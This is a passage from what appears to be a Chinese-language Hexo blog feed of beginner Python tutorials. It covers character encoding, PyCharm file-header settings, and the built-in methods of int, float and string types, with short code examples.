alt="image-20201101193123541"></p><p>现在问题就来了，怎么区分二进制值是字母还是汉字？</p><p>关键在于进制首位的那个0和1，是0就为只读当前比特，1就代表着继续往后读，如图所示：英文占用1个比特位所以首位为0，而中文占用了两个，所以首位从第二个比特位1，读到了第三个比特位1，发现第四个比特位不是1之后，截至，读取是个中文</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/1036857-20170922130238962-1916502463.png" alt="img"></p><h2 id="pycharm的文件头设置"><a href="#pycharm的文件头设置" class="headerlink" title="pycharm的文件头设置"></a>pycharm的文件头设置</h2><p>文件头只需要在主文件加载文件头，并不需要把后续分散文件加上文件头，python在主文件中加了文件头，就会全部应用，所以并不推荐进行设置(除非以后都写单文件程序)</p><h3 id="文件头设置方式"><a href="#文件头设置方式" class="headerlink" title="文件头设置方式"></a>文件头设置方式</h3><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201102151547148.png" alt="image-20201102151547148"></p><h3 id="usr-bin-env-python3-8"><a href="#usr-bin-env-python3-8" class="headerlink" title="#!/usr/bin/env python3.8"></a>#!/usr/bin/env python3.8</h3><p>告诉linux系统采用解释器的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用前运行代码</span><br><span class="line">python3.8 xx.py</span><br><span class="line">使用后运行代码</span><br><span class="line">.&#x2F;xx.py</span><br></pre></td></tr></table></figure><p>第二种设置方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;user&#x2F;bin&#x2F;env python3.8</span><br><span class="line">让env在系统变量中查找python3.8，然后达到运行.&#x2F;xx.py的目的</span><br></pre></td></tr></table></figure><h3 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="# -- coding utf-8 --"></a># -<em>- coding utf-8 -</em>-</h3><p>效果与<code>#coding:utf-8</code>相同，这么写只是为了美观</p><h3 id="文件注释"><a href="#文件注释" class="headerlink" title="文件注释"></a>文件注释</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@version:3.8</span></span><br><span class="line"><span class="string">@author:kinght</span></span><br><span class="line"><span class="string">@file:$&#123;NAME&#125;.py</span></span><br><span class="line"><span class="string">@time:$&#123;DATE&#125; $&#123;TIME&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>注释上解释器版本，开发者，文件名，文件创建时间</p>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14.python数据类型及内置方法</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/14.python%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/14.python%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>关于数据类型，我们已经在前文简单提到过，我们已经知道数据类型是用来记录事物状态的，而事物的状态是不断变化的，这意味着我们在开发程序时需要频繁对数据进行操作，为了提升我们的开发效率， python针对这些常用的操作，为每一种数据类型内置了一系列方法。</p><p>本章的主题就是带大家详细了解下它们，以及每种数据类型的详细定义、类型转换</p><p><strong>python数据类型分类方式</strong></p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-de70fc0b51f69ade62df5cc235acd493_r.jpg" alt="preview"></p><a id="more"></a><hr><h1 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h1><p>数字类型顾名思义就是数字相关的类型，主要为int(整数型)、float(浮点数型)</p><h2 id="int"><a href="#int" class="headerlink" title="int"></a>int</h2><p>整型用于记录整数相关数据</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 变量名 = 值</span></span><br><span class="line">age = <span class="number">22</span></span><br><span class="line">print(type(age))    <span class="comment"># &lt;class &#x27;int&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将纯数字的字符串转换为int类型</span></span><br><span class="line">res = int(<span class="string">&#x27;10001100101&#x27;</span>)</span><br><span class="line">print(res) <span class="comment"># 10001100101</span></span><br><span class="line">print(type(res))    <span class="comment"># &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进制转换</span></span><br><span class="line"><span class="comment"># 十进制转二进制(0b开头为二进制)</span></span><br><span class="line">print(bin(<span class="number">11</span>)) <span class="comment"># 0b1011</span></span><br><span class="line"><span class="comment"># 十进制转八进制(0o开头为八进制)</span></span><br><span class="line">print(oct(<span class="number">11</span>)) <span class="comment"># 0o13</span></span><br><span class="line"><span class="comment"># 十进制转十六进制(0x开头为十六进制)</span></span><br><span class="line">print(hex(<span class="number">11</span>)) <span class="comment"># 0xb</span></span><br><span class="line">print(hex(<span class="number">123</span>)) <span class="comment"># 0x0x7b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他进制转为十进制</span></span><br><span class="line"><span class="comment"># 转十进制直接使用int即可</span></span><br><span class="line"><span class="comment"># 二进制</span></span><br><span class="line">print(int(<span class="number">0b1000101</span>)) <span class="comment"># 69</span></span><br><span class="line"><span class="comment"># 八进制</span></span><br><span class="line">print(int(<span class="number">0o345</span>)) <span class="comment"># 229</span></span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line">print(int(<span class="number">0xe24</span>)) <span class="comment"># 3620</span></span><br></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><p>记录带有小数点的数值</p><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 变量名 = 值</span></span><br><span class="line">weight = <span class="number">101.5</span></span><br><span class="line">print(type(weight))    <span class="comment"># &lt;class &#x27;float&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类型转换-1"><a href="#类型转换-1" class="headerlink" title="类型转换"></a>类型转换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将浮点数字符串转换为浮点数</span></span><br><span class="line">res = float(<span class="string">&quot;3.1415926&quot;</span>)</span><br><span class="line">print(res)  <span class="comment"># 3.1415926</span></span><br><span class="line">print(type(res))    <span class="comment"># &lt;class &#x27;float&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>整型与浮点型没有需要掌握的内置方法，他们的使用就是进行数学运算和比较运算</p><hr><h1 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h1><p>字符串的基本作用就是记录描述性质的内容</p><h2 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">print(type(msg))    <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="类型转换-2"><a href="#类型转换-2" class="headerlink" title="类型转换"></a>类型转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 任意类型转换为字符串</span></span><br><span class="line">stra = str(&#123;<span class="string">&#x27;12&#x27;</span>:<span class="string">&#x27;32&#x27;</span>&#125;)</span><br><span class="line">print(stra)  <span class="comment"># &#123;&#x27;12&#x27;: &#x27;32&#x27;&#125;</span></span><br><span class="line">print(type(stra))    <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><h3 id="按索引取值-正向取-反向取-只能取"><a href="#按索引取值-正向取-反向取-只能取" class="headerlink" title="按索引取值(正向取+反向取):只能取"></a>按索引取值(正向取+反向取):只能取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="comment"># 正向取</span></span><br><span class="line">print(msg[<span class="number">0</span>]) <span class="comment"># h</span></span><br><span class="line">print(msg[<span class="number">5</span>]) <span class="comment">#  (有空格)</span></span><br><span class="line"><span class="comment"># 反向取</span></span><br><span class="line">print(msg[<span class="number">-2</span>]) <span class="comment"># l</span></span><br><span class="line">print(msg[<span class="number">-1</span>]) <span class="comment"># d</span></span><br><span class="line"><span class="comment"># 列表是不可变类型，故不能修改只能取</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切片：索引的拓展引用，从一个大的字符串中拷贝出一个子字符串</span></span><br><span class="line"><span class="comment"># 顾头不顾尾</span></span><br><span class="line">print(msg[<span class="number">0</span>:<span class="number">5</span>]) <span class="comment"># &#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># 步长</span></span><br><span class="line">print(msg[<span class="number">0</span>:<span class="number">5</span>:<span class="number">2</span>]) <span class="comment"># &#x27;hlo&#x27;</span></span><br><span class="line"><span class="comment"># 反向步长(了解)</span></span><br><span class="line"><span class="comment"># 反向步长用于倒着取的时候(不添加步长默认步长为1，无法倒着取)</span></span><br><span class="line">print(msg[<span class="number">5</span>:<span class="number">0</span>:<span class="number">-1</span>]) <span class="comment"># &quot; olle&quot; #同样遵循顾头不顾尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切片不写初始序号被认为从头开始</span></span><br><span class="line">print(msg[:<span class="number">7</span>]) <span class="comment"># &#x27;hello w&#x27;</span></span><br><span class="line"><span class="comment"># 切片不屑结束序号被认为一直到结束</span></span><br><span class="line">print(msg[<span class="number">3</span>:]) <span class="comment"># &#x27;lo world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切片方式完整拷贝字符串</span></span><br><span class="line">print(msg[<span class="number">0</span>:<span class="number">11</span>]) <span class="comment"># &#x27;hello world&#x27; 因为顾头不顾尾，所以需要序号加1</span></span><br><span class="line">print(msg[:]) <span class="comment"># &#x27;hello world&#x27;</span></span><br><span class="line"><span class="comment"># 切片方式倒着完整拷贝字符串</span></span><br><span class="line">print(msg[::<span class="number">-1</span>]) <span class="comment"># &#x27;dlrow olleh&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="统计字符串长度"><a href="#统计字符串长度" class="headerlink" title="统计字符串长度"></a>统计字符串长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">print(len(msg)) <span class="comment"># 11</span></span><br></pre></td></tr></table></figure><h3 id="成员运算"><a href="#成员运算" class="headerlink" title="成员运算"></a>成员运算</h3><p><code>in</code>和<code>not in</code>判断一个子字符串是否在存在于一个大字符串中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># in 是否在其中</span></span><br><span class="line">print(<span class="string">&#x27;kinght&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;kinghtxg.geekxk.com&#x27;</span>) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># not in 是否不在其中</span></span><br><span class="line">print(<span class="string">&#x27;kinght&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;kinght love lbg&#x27;</span> ) <span class="comment"># False</span></span><br><span class="line">print(<span class="keyword">not</span> <span class="string">&#x27;kinght&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;kinght love lbg&#x27;</span> ) <span class="comment"># False 不推荐这种书写方式</span></span><br></pre></td></tr></table></figure><h3 id="移除空白strip"><a href="#移除空白strip" class="headerlink" title="移除空白strip"></a>移除空白strip</h3><p>通过函数移除空格</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认移除字符串左右两侧的符号(不改变原值而是产生新的值)</span></span><br><span class="line">msg = <span class="string">&quot;    kinght    &quot;</span></span><br><span class="line">print(msg.strip())  <span class="comment"># kinght</span></span><br><span class="line"><span class="comment"># 修改值可去掉其他内容</span></span><br><span class="line">msg = <span class="string">&quot;****kin**ght*****&quot;</span></span><br><span class="line">print(msg.strip(<span class="string">&#x27;*&#x27;</span>)) <span class="comment"># kin**ght # 只去掉两边不去中间</span></span><br><span class="line"><span class="comment"># 可添加多个值取值</span></span><br><span class="line">msg = <span class="string">&quot;!@#SWQE!kinght@#SD#!@#&quot;</span></span><br><span class="line">print(msg.strip(<span class="string">&#x27;!@#SWQED&#x27;</span>)) <span class="comment"># kinght 将所有不要的参数全都加进来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 左右去除</span></span><br><span class="line">msg = <span class="string">&quot;****kinght****&quot;</span></span><br><span class="line"><span class="comment"># 去除左边 lstrip</span></span><br><span class="line">print(msg.lstrip(<span class="string">&#x27;*&#x27;</span>)) <span class="comment"># kinght****</span></span><br><span class="line"><span class="comment"># 去除右边 rstrip</span></span><br><span class="line">print(msg.rstrip(<span class="string">&#x27;*&#x27;</span>)) <span class="comment"># ****kinght</span></span><br></pre></td></tr></table></figure><h3 id="切分split"><a href="#切分split" class="headerlink" title="切分split"></a>切分split</h3><p>把一个字符串按照某种分隔符进行切分得到一个列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info = <span class="string">&quot;kinghtxg.geekxk.com&quot;</span></span><br><span class="line"><span class="comment"># split把字符串分割成列表</span></span><br><span class="line"><span class="comment"># 默认分隔符是空格，这里使用.进行的分隔</span></span><br><span class="line">res = info.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">print(res) <span class="comment"># [&#x27;kinghtxg&#x27;, &#x27;geekxk&#x27;, &#x27;com&#x27;]</span></span><br><span class="line"><span class="comment"># 指定分隔次数</span></span><br><span class="line">print(info.split(<span class="string">&#x27;.&#x27;</span>,<span class="number">1</span>)) <span class="comment"># [&#x27;kinghtxg&#x27;, &#x27;geekxk.com&#x27;]</span></span><br><span class="line"><span class="comment"># 从右往左开始切 rsplit</span></span><br><span class="line">print(info.rsplit(<span class="string">&#x27;.&#x27;</span>,<span class="number">1</span>)) <span class="comment"># 不添加分割次数会全切看不出效果</span></span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><p>按照某个分隔符把纯字符串的列表拼接成一个大字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;like&#x27;</span>,<span class="string">&#x27;lbg&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;:&quot;</span>.join(list)) <span class="comment"># kinght:like:lbg</span></span><br></pre></td></tr></table></figure><h3 id="循环的使用"><a href="#循环的使用" class="headerlink" title="循环的使用"></a>循环的使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">demo = <span class="string">&#x27;kinght&#x27;</span></span><br><span class="line"><span class="comment"># 字符串可以像列表一样放入for循环中使用，每个字符为一次取值</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> demo:</span><br><span class="line">    print(x,end=<span class="string">&quot;|&quot;</span>) <span class="comment"># k|i|n|g|h|t|</span></span><br></pre></td></tr></table></figure><h3 id="大小写变换lower，upper"><a href="#大小写变换lower，upper" class="headerlink" title="大小写变换lower，upper"></a>大小写变换lower，upper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;AAAbbbCCC&quot;</span></span><br><span class="line">print(msg.lower())  <span class="comment"># 转为小写 aaabbbccc</span></span><br><span class="line">print(msg.upper())  <span class="comment"># 转为大写 AAABBBCCC</span></span><br></pre></td></tr></table></figure><h3 id="startswitch、endswith"><a href="#startswitch、endswith" class="headerlink" title="startswitch、endswith"></a>startswitch、endswith</h3><p>判断开头与结尾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;kinght like lbg&quot;</span></span><br><span class="line">print(msg.startswith(<span class="string">&#x27;kinght&#x27;</span>)) <span class="comment"># 判断msg的开头是否是kinght</span></span><br><span class="line">print(<span class="string">&quot;kinght like lbg&quot;</span>.endswith((<span class="string">&#x27;lbg&#x27;</span>))) <span class="comment"># 判断kinght like lbg的结尾是不是lbg</span></span><br></pre></td></tr></table></figure><h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>替换字符串字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;you can you up no can no bb&quot;</span></span><br><span class="line">print(msg.replace(<span class="string">&quot;you&quot;</span>,<span class="string">&quot;YOU&quot;</span>,<span class="number">1</span>)) <span class="comment"># YOU can you up no can no bb</span></span><br><span class="line"><span class="comment"># 变量名.replace(&quot;目标字符&quot;,&quot;替换字符串&quot;,替换次数) # 不写替换次数默认全体替换</span></span><br></pre></td></tr></table></figure><h3 id="isdigit"><a href="#isdigit" class="headerlink" title="isdigit"></a>isdigit</h3><p>判断字符串是否有纯数字组成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;123&quot;</span>.isdigit())  <span class="comment">#True</span></span><br><span class="line">print(<span class="string">&quot;12.3&quot;</span>.isdigit()) <span class="comment">#带点都不行 False</span></span><br><span class="line">print(<span class="string">&quot;1a23&quot;</span>.isdigit()) <span class="comment">#带字母更不行 False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改简单年龄校验demo</span></span><br><span class="line">age = input(<span class="string">&quot;请输入你的年龄：&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> age.isdigit():</span><br><span class="line">    age = int(age)</span><br><span class="line">    <span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">        print(<span class="string">&quot;已成年&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;未成年，请退出&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;年龄请输入纯数字&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="find和index"><a href="#find和index" class="headerlink" title="find和index"></a>find和index</h3><p>查找字符串，返回要查找的字符串在大字符串中的起始索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;demo1,demo2.demo3&quot;</span></span><br><span class="line"><span class="comment"># 如果找到返回查找字符串在被查找字符串的起始索引</span></span><br><span class="line"><span class="comment"># 能找到则find和index完全相同</span></span><br><span class="line">print(msg.find(<span class="string">&quot;demo2&quot;</span>)) <span class="comment"># 6</span></span><br><span class="line">print(msg.index(<span class="string">&quot;mo1,&quot;</span>)) <span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 不能找到find和index结果不相同</span></span><br><span class="line">print(msg.find(<span class="string">&quot;haha&quot;</span>)) <span class="comment"># -1 找不到返回负1</span></span><br><span class="line">print(msg.index(<span class="string">&quot;haha&quot;</span>)) <span class="comment"># 找不到直接报错</span></span><br></pre></td></tr></table></figure><h3 id="count"><a href="#count" class="headerlink" title="count"></a>count</h3><p>统计个数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;saduiusadasdfgkahasduiasfhkasf&quot;</span></span><br><span class="line">print(msg.count(<span class="string">&#x27;d&#x27;</span>)) <span class="comment"># 4 d在msg字符串中出现了四次</span></span><br><span class="line">print(msg.count(<span class="string">&#x27;k&#x27;</span>)) <span class="comment"># 2 d在msg字符串中出现了二次</span></span><br><span class="line">print(msg.count(<span class="string">&#x27;asd&#x27;</span>)) <span class="comment"># 2 asd在msg字符串中出现了二次</span></span><br></pre></td></tr></table></figure><h3 id="center-ljust-rjust-zfill"><a href="#center-ljust-rjust-zfill" class="headerlink" title="center,ljust,rjust,zfill"></a>center,ljust,rjust,zfill</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># center 居中显示，center(字符串长度，&#x27;补充符号&#x27;)</span></span><br><span class="line"><span class="comment"># **********************kinght**********************</span></span><br><span class="line">print(<span class="string">&quot;kinght&quot;</span>.center(<span class="number">50</span>,<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line"><span class="comment">#                       kinght</span></span><br><span class="line">print(<span class="string">&quot;kinght&quot;</span>.center(<span class="number">50</span>,<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ljust 靠左显示，ljust(字符串长度,&#x27;补充符号&#x27;)</span></span><br><span class="line"><span class="comment"># kinght############################################</span></span><br><span class="line">print(<span class="string">&quot;kinght&quot;</span>.ljust(<span class="number">50</span>,<span class="string">&quot;#&quot;</span>))</span><br><span class="line"><span class="comment"># rjust 靠右显示，rjust(字符串长度,&#x27;补充符号&#x27;)</span></span><br><span class="line"><span class="comment"># &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;kinght</span></span><br><span class="line">print(<span class="string">&quot;kinght&quot;</span>.rjust(<span class="number">50</span>,<span class="string">&quot;&amp;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># zfile 靠右显示，且用0填充 zfile(字符串长度)</span></span><br><span class="line"><span class="comment"># 00000000000000000000000000000000000000000000kinght</span></span><br><span class="line">print(<span class="string">&quot;kinght&quot;</span>.zfill(<span class="number">50</span>))</span><br></pre></td></tr></table></figure><h3 id="expandtabs"><a href="#expandtabs" class="headerlink" title="expandtabs"></a>expandtabs</h3><p>修改制表符宽度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;hello\tworld&quot;</span></span><br><span class="line"><span class="comment"># 设置msg的制表符宽度为2个空格</span></span><br><span class="line">print(msg.expandtabs(<span class="number">10</span>)) <span class="comment"># hello     world</span></span><br></pre></td></tr></table></figure><h3 id="captalize-swapcase-title"><a href="#captalize-swapcase-title" class="headerlink" title="captalize,swapcase,title"></a>captalize,swapcase,title</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串.capitalize() 转换为首字母大写(不能传参)</span></span><br><span class="line">print(<span class="string">&quot;hello world , kinght&quot;</span>.capitalize()) <span class="comment"># Hello world , kinght</span></span><br><span class="line"><span class="comment"># 字符串.swapcase() 大小写反转(不能传参)</span></span><br><span class="line">print(<span class="string">&quot;hEllo woLld , KiNGht&quot;</span>.swapcase()) <span class="comment"># HeLLO WOlLD , kIngHT</span></span><br><span class="line"><span class="comment"># 字符串.title() 每个单词首字母大写(不能传参)</span></span><br><span class="line">print(<span class="string">&quot;hello world , kinght&quot;</span>.title()) <span class="comment"># Hello World , Kinght</span></span><br></pre></td></tr></table></figure><h3 id="is系列"><a href="#is系列" class="headerlink" title="is系列"></a>is系列</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断字符串是否全为小写</span></span><br><span class="line">print(<span class="string">&#x27;abc&#x27;</span>.islower()) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 判断字符串是否全为大写</span></span><br><span class="line">print(<span class="string">&#x27;aBc&#x27;</span>.isupper()) <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 判断字符串是否首字母大写</span></span><br><span class="line">print(<span class="string">&#x27;Hello World&#x27;</span>.istitle()) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 判断字符串是否是字母和数字构成</span></span><br><span class="line"><span class="comment"># 必须是字母和纯数字不能加其他符号，可以纯数字或纯字母</span></span><br><span class="line">print(<span class="string">&#x27;123abc&#x27;</span>.isalnum()) <span class="comment"># True</span></span><br><span 